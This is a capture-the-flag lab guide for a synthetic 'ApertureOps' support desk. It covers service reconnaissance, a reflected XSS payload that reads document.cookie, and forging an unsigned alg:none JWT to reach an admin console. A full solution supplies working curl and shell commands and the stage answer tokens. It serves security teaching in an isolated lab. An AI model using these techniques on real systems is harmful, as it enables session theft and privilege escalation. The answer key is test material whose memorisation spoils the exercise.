# Lab 07 — ApertureOps: The Support Desk Incident

Level: Intermediate | Mode: challenge | Time: 60–75 minutes

## Scenario

Northstar Shipping uses ApertureOps for staff support. An analyst received a suspicious ticket, and the operations API later accepted an unexpected admin request. You are authorized to reconstruct that path using the two training services. Start at `edge-gateway`; follow its service banner and public web clues to the support preview, inspect the simulated session exposure, and test the API's trust in JWT claims.

```text
service banner → public web clues → support preview → simulated session → unsigned JWT → admin report
```

## What you need to know

Recommended first: Labs 01–02; read the web briefing below.

- **HTTP** is a request/response protocol. A URL contains a host, optional port, and path. `curl -i` shows headers and body; `curl -I` requests headers only.
- **HTML source** can contain comments invisible in a browser. `robots.txt` is public crawler guidance; a listed path might be reachable, but listing it does not prove access.
- **Reflected XSS** occurs when untrusted input is inserted into a page without suitable encoding. This lab returns unencoded HTML. Its ticket reviewer is a clearly labeled simulation: it recognizes a script containing `document.cookie`, returns a synthetic session, and never executes JavaScript or contacts a collector.
- A **cookie** can carry a session token. A JWT has base64url header, payload, and signature segments separated by dots. Decoding reveals claims; it does not establish that claims are trustworthy.
- An **Authorization: Bearer** header presents a token to an API. This API intentionally accepts an unsigned `alg:none` token for the known analyst session with an admin role. The outcome is application admin access.
- `jq` reads JSON fields. `base64` encodes or decodes text; `cut -d. -f2` selects the JWT payload. `tr` translates the URL-safe alphabet and strips padding while encoding. `printf` constructs text without a trailing newline; shell variables preserve intermediate values.
- Reuse `nmap` and `nc` from Lab 01 to distinguish plain TCP from HTTP before choosing a client.

## Start the lab

Read the [setup guide](../GETTING-STARTED.md) first.

**Host terminal**, in the project directory:

```sh
node scripts/standalone-labctl.mjs start 07-web-breach-chain
node scripts/standalone-labctl.mjs shell 07-web-breach-chain
```

The second command enters the Linux toolbox. Investigation commands run there;
verification runs in a second **host terminal**. Scope: `edge-gateway` (172.31.7.20, ports 8080 and 9091), `ops-internal` (172.31.7.30, port 8081), subnet 172.31.7.0/24.
All data is synthetic and each lab has its own isolated network.
Record tokens for the case and submit only the corresponding RLAB flag to verify.

## Objectives

### Flag 1 — Map the edge service (`recon-sweep`)

Identify the edge listeners and read the non-HTTP banner. Record the recon token and the HTTP destination it advertises.

### Flag 2 — Trace the web surface (`surface-map`)

Inspect public headers, source, and crawler guidance. Recover the developer handover and record what it says about support reports.

### Flag 3 — Demonstrate the session exposure (`web-foothold`)

Compare ordinary text with markup in the support preview. Submit the training payload to the simulated reviewer and record the returned JWT and foothold token.

### Flag 4 — Test authorization (`privilege-escalation`)

Decode the session, preserve its subject and session ID, and demonstrate that changing unsigned role claims grants application admin access.

### Flag 5 — Write the incident conclusion (`root-proof`)

Submit all stage tokens with the forged bearer token. Explain which controls would break the chain. The legacy objective ID is root-proof, but this earns no OS root access.

## Hints

Open only the hint block you need. Read one hint at a time.

### Flag 1 — recon-sweep

<details>
<summary>Hint 1 — where to look</summary>

The scan distinguishes a text beacon from the web portal.

</details>

<details>
<summary>Hint 2 — what to try</summary>

Use the raw TCP client introduced in Lab 01 for port 9091.

</details>

<details>
<summary>Hint 3 — concrete help</summary>

Run `nc -w 3 edge-gateway 9091 </dev/null` and follow `next=http/8080`.

</details>

### Flag 2 — surface-map

<details>
<summary>Hint 1 — where to look</summary>

Inspect the page source and robots.txt before guessing paths.

</details>

<details>
<summary>Hint 2 — what to try</summary>

A developer left a staging helper in an HTML comment.

</details>

<details>
<summary>Hint 3 — concrete help</summary>

Request `/api/dev/hello` on port 8080.

</details>

### Flag 3 — web-foothold

<details>
<summary>Hint 1 — where to look</summary>

The developer helper names a preview parameter and ticket endpoint.

</details>

<details>
<summary>Hint 2 — what to try</summary>

Use `--get --data-urlencode` to send markup safely in a query.

</details>

<details>
<summary>Hint 3 — concrete help</summary>

POST `report=<script>document.cookie</script>` to `/support/ticket`. The server labels this synthetic reviewer behavior.

</details>

### Flag 4 — privilege-escalation

<details>
<summary>Hint 1 — where to look</summary>

A JWT is three dot-separated segments; inspect the second one.

</details>

<details>
<summary>Hint 2 — what to try</summary>

Keep the stolen `sub` and `sid`; change role to admin, header alg to none, and leave the signature empty.

</details>

<details>
<summary>Hint 3 — concrete help</summary>

Construct `header.payload.` and send `Authorization: Bearer $forged` to `http://ops-internal:8081/admin/console`.

</details>

### Flag 5 — root-proof

<details>
<summary>Hint 1 — where to look</summary>

Retain the four tokens from the previous steps.

</details>

<details>
<summary>Hint 2 — what to try</summary>

The final endpoint also requires the same authorized bearer token.

</details>

<details>
<summary>Hint 3 — concrete help</summary>

POST `recon`, `surface`, `foothold`, and `admin` to `http://ops-internal:8081/final`.

</details>

## Solution

Record the `objective_flag=RLAB{...}` value at each stage and submit it with
`verify` (from a second terminal). Objectives are gated in order.

### 1. Recon sweep (`recon-sweep`)

Map the segment, scan the edge host, and read its service beacon.

**Toolbox:**

```sh
nmap -sT -Pn -p 1-10000 edge-gateway
nc -w 3 edge-gateway 9091 </dev/null      # APERTURE-EDGE beacon → recon_token + flag
```

**Host terminal — submit this stage's displayed flag:**

```sh
node scripts/standalone-labctl.mjs verify 07-web-breach-chain recon-sweep 'RLAB{...}'
```

### 2. Surface map (`surface-map`)

Fingerprint the portal and discover the developer route it forgot to remove.

**Toolbox:**

```sh
curl -I http://edge-gateway:8080/            # Server: ApertureOps/2.3
curl -s http://edge-gateway:8080/            # HTML comment hints at /api/dev/hello
curl -s http://edge-gateway:8080/robots.txt  # Disallow: /api/dev
curl -s http://edge-gateway:8080/api/dev/hello   # surface_token + flag
```

**Host terminal — submit this stage's displayed flag:**

```sh
node scripts/standalone-labctl.mjs verify 07-web-breach-chain surface-map 'RLAB{...}'
```

### 3. Web foothold (reflected XSS) (`web-foothold`)

`/support?msg=` reflects input without encoding. Submit a report whose script
reads `document.cookie`; the on-call analyst "opens" it in their session and
the simulator returns a synthetic session token. No browser or collector runs.

**Toolbox:**

```sh
curl -s --get --data-urlencode 'msg=<b>xss</b>' http://edge-gateway:8080/support   # confirm the sink reflects
curl -s -X POST \
  --data-urlencode 'report=<script>document.cookie</script>' \
  http://edge-gateway:8080/support/ticket        # stolen_cookie=session=<JWT> + foothold_token + flag
```

**Host terminal — submit this stage's displayed flag:**

```sh
node scripts/standalone-labctl.mjs verify 07-web-breach-chain web-foothold 'RLAB{...}'
```

### 4. Privilege escalation (JWT alg:none) (`privilege-escalation`)

Decode the stolen analyst JWT, preserve its `sid`, then forge a token with
`"alg":"none"`, `"role":"admin"`, and an empty signature to unlock the
internal admin console.

**Toolbox:**

```sh
stolen='<JWT copied from stolen_cookie=session=...>'
encoded_payload=$(printf '%s' "$stolen" | cut -d. -f2)
case $((${#encoded_payload} % 4)) in
  2) encoded_payload="${encoded_payload}==" ;;
  3) encoded_payload="${encoded_payload}=" ;;
esac
payload_json=$(printf '%s' "$encoded_payload" | tr '_-' '/+' | base64 -d)
sub=$(printf '%s' "$payload_json" | jq -er '.sub | select(type == "string")')
sid=$(printf '%s' "$payload_json" | jq -er '.sid | select(type == "string")')
h=$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=\n' | tr '+/' '-_')
p=$(jq -cn --arg sub "$sub" --arg sid "$sid" '{sub:$sub,role:"admin",sid:$sid}' | base64 | tr -d '=\n' | tr '+/' '-_')
forged="$h.$p."
curl -s -H "Authorization: Bearer $forged" http://ops-internal:8081/admin/console
# admin_token=root-obsidian-77 + flag
```

**Host terminal — submit this stage's displayed flag:**

```sh
node scripts/standalone-labctl.mjs verify 07-web-breach-chain privilege-escalation 'RLAB{...}'
```

### 5. Application incident report (`root-proof`)

Chain every recovered token and the forged bearer token into the final route.
It returns `401` without an authorized forged token and `403` until all four
stage tokens match.

**Toolbox:**

```sh
curl -s -X POST \
  -H "Authorization: Bearer $forged" \
  --data-urlencode 'recon=beacon-argon-19' \
  --data-urlencode 'surface=surface-quartz-52' \
  --data-urlencode 'foothold=foothold-cinder-88' \
  --data-urlencode 'admin=root-obsidian-77' \
  http://ops-internal:8081/final              # final_proof + flag
```

**Host terminal — submit this stage's displayed flag:**

```sh
node scripts/standalone-labctl.mjs verify 07-web-breach-chain root-proof 'RLAB{...}'
```

## What this taught you

This chain crosses two trust decisions: rendering a report and accepting identity claims. Encode output, protect session cookies, verify JWT signatures with an explicit algorithm, and enforce authorization using server-side policy. Continue in Lab 08 to analyze the cache recovered during this incident.

## Stop or reset

**Host terminal — finish this session without clearing submitted progress:**

```sh
node scripts/standalone-labctl.mjs status 07-web-breach-chain
node scripts/standalone-labctl.mjs stop 07-web-breach-chain
```

To continue later, use the start and shell commands above. Your flags and
submitted progress stay the same. Files downloaded into the toolbox's /tmp do
not survive stop; download them again when you resume.

**Optional clean retry — deletes this lab's progress and creates new flags:**

```sh
node scripts/standalone-labctl.mjs reset 07-web-breach-chain
```
